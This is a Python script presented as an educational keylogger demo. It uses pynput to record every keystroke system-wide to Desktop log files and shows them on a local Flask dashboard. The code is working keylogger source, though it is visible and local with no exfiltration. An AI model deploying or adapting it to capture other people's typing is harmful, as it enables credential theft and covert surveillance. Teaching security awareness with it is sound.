"""
============================================================
  EDUCATIONAL KEYLOGGER DEMO
  For internship/cybersecurity awareness purposes only.
  Run this script, then open http://localhost:5000
============================================================
"""

import os
import sys
import json
import time
import signal
import threading
import platform
from datetime import datetime
from pathlib import Path

# ── Dependency check ──────────────────────────────────────
MISSING = []
try:
    from pynput import keyboard
except ImportError:
    MISSING.append("pynput")

try:
    from flask import Flask, render_template, jsonify
except ImportError:
    MISSING.append("flask")

if MISSING:
    print(f"\n[!] Missing packages: {', '.join(MISSING)}")
    print(f"    Install them with:  pip install {' '.join(MISSING)}\n")
    sys.exit(1)

# ── Config ────────────────────────────────────────────────
DESKTOP = Path.home() / "Desktop"
DESKTOP.mkdir(exist_ok=True)
LOG_FILE   = DESKTOP / "keylog_session.txt"
JSON_FILE  = DESKTOP / "keylog_session.json"
MAX_EVENTS = 500           # cap stored in memory for the dashboard
SESSION_START = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ── Shared state ──────────────────────────────────────────
events      = []           # list of dicts  {time, key, type}
events_lock = threading.Lock()
running     = True

# ── Logging helpers ───────────────────────────────────────
def log_event(key_str: str, event_type: str):
    """Append one keystroke to memory, log file, and JSON file."""
    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = {"time": ts, "key": key_str, "type": event_type}

    with events_lock:
        events.append(entry)
        if len(events) > MAX_EVENTS:
            events.pop(0)

    # Plain-text log
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {event_type:8s}  {key_str}\n")

    # JSON snapshot (overwrite every keystroke – small overhead, simple)
    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump({
            "session_start": SESSION_START,
            "platform": platform.system(),
            "events": events
        }, f, indent=2)

def format_key(key) -> str:
    """Return a human-readable string for a pynput Key or KeyCode."""
    try:
        return key.char if key.char else f"[{key.name}]"
    except AttributeError:
        return f"[{str(key).replace('Key.', '')}]"

# ── pynput listeners ──────────────────────────────────────
def on_press(key):
    log_event(format_key(key), "PRESS")

def on_release(key):
    log_event(format_key(key), "RELEASE")

def start_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ── Flask web dashboard ───────────────────────────────────
app = Flask(__name__, template_folder="templates")

@app.route("/")
def index():
    return render_template("dashboard.html",
                           session_start=SESSION_START,
                           platform=platform.system(),
                           log_file=str(LOG_FILE))

@app.route("/api/events")
def api_events():
    with events_lock:
        return jsonify({
            "session_start": SESSION_START,
            "total": len(events),
            "events": list(reversed(events))   # newest first
        })

@app.route("/api/stats")
def api_stats():
    with events_lock:
        presses  = [e for e in events if e["type"] == "PRESS"]
        releases = [e for e in events if e["type"] == "RELEASE"]
        specials = [e for e in presses if e["key"].startswith("[")]
        chars    = [e for e in presses if not e["key"].startswith("[")]
    return jsonify({
        "total_presses":  len(presses),
        "total_releases": len(releases),
        "special_keys":   len(specials),
        "char_keys":      len(chars),
        "last_10":        [e["key"] for e in presses[-10:]]
    })

# ── Graceful shutdown ─────────────────────────────────────
def shutdown(sig=None, frame=None):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n── Session ended {ts} ──\n")
    print(f"\n[*] Keylogger stopped. Log saved to:\n    {LOG_FILE}\n")
    os._exit(0)

signal.signal(signal.SIGINT,  shutdown)
signal.signal(signal.SIGTERM, shutdown)

# ── Entry point ───────────────────────────────────────────
if __name__ == "__main__":
    # Write session header to log
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n{'='*55}\n")
        f.write(f"  Session started : {SESSION_START}\n")
        f.write(f"  Platform        : {platform.system()}\n")
        f.write(f"{'='*55}\n")

    print("="*55)
    print("  EDUCATIONAL KEYLOGGER DEMO")
    print(f"  Session : {SESSION_START}")
    print(f"  Log     : {LOG_FILE}")
    print(f"  Dashboard : http://localhost:5000")
    print("  Press  Ctrl+C  to stop")
    print("="*55)

    # Start keyboard listener in background thread
    t = threading.Thread(target=start_listener, daemon=True)
    t.start()

    # Start Flask (blocking)
    app.run(host="127.0.0.1", port=5000, debug=False, use_reloader=False)
